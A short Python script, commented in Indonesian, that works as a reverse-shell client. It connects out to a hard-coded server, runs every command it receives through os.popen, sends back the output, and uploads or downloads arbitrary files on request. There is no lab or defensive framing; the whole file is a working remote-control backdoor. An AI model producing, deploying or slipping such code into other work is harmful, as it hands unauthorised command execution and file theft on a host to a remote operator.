import socket
import os

server_ip = "192.168.1.100"  # Ganti dengan IP server di PC
server_port = 9999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((server_ip, server_port))

def send_file(filename):
    with open(filename, "rb") as f:
        while chunk := f.read(4096):
            client.send(chunk)
    print(f"File {filename} berhasil dikirim ke PC!")

def receive_file(filename):
    with open(filename, "wb") as f:
        while True:
            data = client.recv(4096)
            if not data:
                break
            f.write(data)
    print(f"File {filename} berhasil diterima dari PC!")

while True:
    command = client.recv(1024).decode()
    if command.lower() == "exit":
        break
    elif command.startswith("getfile"):
        send_file(command.split(" ")[1])
    elif command.startswith("sendfile"):
        receive_file(command.split(" ")[1])
    else:
        output = os.popen(command).read()  
        if not output:
            output = "Perintah dijalankan, tapi tidak ada output."
        client.send(output.encode())

client.close()
